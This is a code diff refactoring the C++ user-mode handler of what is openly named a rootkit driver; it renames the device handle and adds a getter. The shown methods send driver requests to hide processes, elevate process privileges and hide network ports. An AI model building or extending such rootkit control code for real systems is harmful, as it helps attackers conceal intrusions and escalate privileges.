@@ -3,7 +3,7 @@
 
 
 Driver::DriverHandler::DriverHandler() {
-	hDevice = CreateFile(
+	m_device_handle = CreateFile(
 		Driver::DeviceName,
 		GENERIC_WRITE,
 		FILE_SHARE_WRITE,
@@ -16,7 +16,7 @@ Driver::DriverHandler::DriverHandler() {
 
 
 Driver::DriverHandler::~DriverHandler() {
-	CloseHandle(hDevice);
+	CloseHandle(m_device_handle);
 }
 
 
@@ -25,7 +25,7 @@ bool Driver::DriverHandler::check_connection(char* message)
 	char ReadBuffer[Driver::TestConnectionMaxLength] = { 0 };
 	DWORD returned;
 	bool status = DeviceIoControl(
-		hDevice,
+		m_device_handle,
 		static_cast<DWORD>(Driver::RookitIoctls::TestConnection),
 		message, strlen(message),
 		ReadBuffer,
@@ -48,7 +48,7 @@ bool Driver::DriverHandler::hide_process(char* message) {
 	DWORD returned;
 
 	bool status = DeviceIoControl(
-		hDevice,
+		m_device_handle,
 		static_cast<DWORD>(Driver::RookitIoctls::HideProcces),
 		message,
 		strlen(message),
@@ -70,7 +70,7 @@ bool Driver::DriverHandler::elevate_process(char* message) {
 	DWORD returned;
 
 	bool status = DeviceIoControl(
-		hDevice,
+		m_device_handle,
 		static_cast<DWORD>(Driver::RookitIoctls::Elevate),
 		message,
 		strlen(message),
@@ -92,7 +92,7 @@ bool Driver::DriverHandler::hide_port(char* message) {
 	DWORD returned;
 
 	bool status = DeviceIoControl(
-		hDevice,
+		m_device_handle,
 		static_cast<DWORD>(Driver::RookitIoctls::HidePort),
 		message,
 		strlen(message),
@@ -108,4 +108,8 @@ bool Driver::DriverHandler::hide_port(char* message) {
 		logError("couldn't hide port");
 
 	return status;
+}
+
+HANDLE Driver::DriverHandler::device_handle(){
+	return m_device_handle;
 }
